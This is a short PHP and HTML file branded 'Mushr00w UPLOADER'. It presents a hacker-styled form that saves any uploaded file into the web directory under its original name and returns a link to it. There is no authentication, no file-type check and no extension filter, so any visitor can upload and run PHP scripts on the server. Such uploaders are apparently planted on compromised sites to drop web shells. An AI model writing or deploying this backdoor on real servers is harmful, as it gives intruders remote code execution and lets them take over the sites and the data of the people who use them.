<?php
if(isset($_FILES['file'])){
    $target = basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
        echo "Uploaded: <a href='$target'>$target</a>";
    } else {
        echo "Upload failed!";
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Upload</title></head>
<body style="background:#0a0a0a;color:#00ff00;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
<form method="POST" enctype="multipart/form-data" style="background:#111;padding:40px;border:2px solid #00ff00;border-radius:10px;text-align:center;">
<h2 style="font-size:22px;">Mushr00w UPLOADER</h2>
<input type="file" name="file" required style="background:#0a0a0a;color:#00ff00;border:1px solid #00ff00;padding:10px;border-radius:5px;">
<br><br>
<button type="submit" style="background:#00ff00;color:#0a0a0a;padding:10px 30px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">CLICK TO UPLOAD</button>
</form>
</body>
</html>